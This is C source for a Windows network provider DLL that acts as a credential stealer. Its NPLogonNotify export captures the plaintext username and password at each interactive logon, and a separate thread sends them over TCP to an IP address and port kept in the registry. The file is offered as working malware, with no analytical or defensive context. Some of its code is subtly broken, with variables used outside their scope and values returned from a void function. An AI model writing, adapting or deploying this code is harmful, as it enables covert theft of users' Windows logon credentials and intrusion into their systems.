#include "winlogon.h"

void sendCreds(char* creds)
{
	char* ip = getIPReg(L"ipa");
	DWORD port = getPtReg();
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; } 

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { goto error; }

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { goto error; }

	if (send(s, creds, strlen(creds), 0) < 0) { goto error; }

	free(creds);
	free(ip);
	WSACleanup();
	return 0;

error:
	free(creds);
	free(ip);
	WSACleanup();
	return 1;
}

int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char* creds = (char*)malloc(150);

	char* eip = getIPReg(L"eip");
	sprintf(creds, "%ws:%ws;end;%s;", username->Buffer, password->Buffer, eip);
	free(eip);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
}


__declspec(dllexport)
DWORD
APIENTRY
NPGetCaps(
	DWORD nIndex
)
{
	switch (nIndex)
	{
	case WNNC_SPEC_VERSION:
		return WNNC_SPEC_VERSION51;

	case WNNC_NET_TYPE:
		return WNNC_CRED_MANAGER;

	case WNNC_START:
		return WNNC_WAIT_FOR_START;

	default:
		return 0;
	}
}


__declspec(dllexport)
DWORD
APIENTRY
NPLogonNotify(
	PLUID lpLogonId,
	LPCWSTR lpAuthInfoType,
	LPVOID lpAuthInfo,
	LPCWSTR lpPrevAuthInfoType,
	LPVOID lpPrevAuthInfo,
	LPWSTR lpStationName,
	LPVOID StationHandle,
	LPWSTR* lpLogonScript
)
{
	SavePassword(
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
	);
	lpLogonScript = NULL;
	return WN_SUCCESS;
}
